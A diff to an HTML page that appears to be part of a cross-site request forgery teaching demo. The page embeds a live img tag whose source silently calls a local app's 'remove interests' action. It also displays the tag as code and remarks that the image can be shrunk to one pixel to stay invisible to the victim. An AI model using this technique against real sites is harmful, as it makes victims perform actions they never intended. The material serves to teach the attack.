@@ -6,17 +6,22 @@
     </head>
 
     <body>
-        Take a look at my picture:<br />
+        <p><a href="index.html" title="Menu">Back to menu</a><br /></p>
+
+        <p>Take a look at my picture:<br />
         <img src="http://127.0.0.1:8080/?p=interests&action=remove&id=7" alt="My image.jpg" />
-        <br />
-        <small>Image can be reduced to 1x1 pixels size in order to be totally 
-        invisible for the victim!</small>
-        <br />
+        </p>
         <br />
         <hr />
         Code:<br />
         <code>
-        &lt;img src="http://127.0.0.1:8080/?p=interests&amp;action=remove&amp;id=7" alt="My image.jpg" /&gt;
+        &lt;img <span style="color:red;">src="http://127.0.0.1:8080/?p=interests&amp;action=remove&amp;id=7"</span> alt="My image.jpg" /&gt;
         </code>
+        <br />
+
+        <p>
+        <small>Image can be reduced to 1x1 pixels size in order to be totally 
+        invisible for the victim!</small>
+        </p>
     </body>
 </html>
